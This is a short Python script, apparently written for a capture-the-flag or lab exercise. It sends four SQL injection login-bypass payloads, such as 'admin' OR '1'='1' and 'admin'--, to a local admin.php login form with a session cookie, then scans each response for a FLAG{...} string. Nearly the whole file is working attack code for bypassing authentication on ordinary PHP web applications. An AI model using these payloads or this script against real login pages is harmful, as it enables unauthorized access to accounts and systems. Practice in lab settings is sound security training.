import requests
import re

target = "http://127.0.0.1:32816/admin.php"
cookie = {"PHPSESSID": "40bd21fd631cfebd5f684d8a97f3d915"}

payloads = [
    "admin' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
    "admin' OR 1=1--"
]

results = []
for p in payloads:
    r = requests.post(target, data={"username": p, "password": "x"}, cookies=cookie, allow_redirects=False)
    results.append((p, r.status_code, len(r.text), r.text))

for p, s, l, t in results:
    print(f"{p} -> {s} {l}B")
    if 'FLAG{' in t:
        print(f"FLAG: {re.search(r'FLAG\{[^}]+\}', t).group(0)}")
        print(t)

